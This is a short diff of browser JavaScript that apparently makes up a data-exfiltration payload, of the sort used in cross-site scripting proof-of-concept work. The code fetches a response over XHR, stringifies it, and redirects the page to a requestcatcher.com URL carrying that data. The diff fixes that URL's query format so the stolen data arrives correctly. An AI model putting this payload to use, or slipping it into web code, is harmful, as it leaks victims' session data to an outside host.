@@ -4,6 +4,6 @@ xhr.setRequestHeader('Content-type', 'application/json');
 xhr.onload = () => {
     const data = JSON.parse(xhr.responseText);
 var imran= (JSON.stringify(data));
-location.replace("https://imx.requestcatcher.com/test=" + imran );
+location.replace("https://imx.requestcatcher.com/?test=" + imran );
 };
 xhr.send('{}');
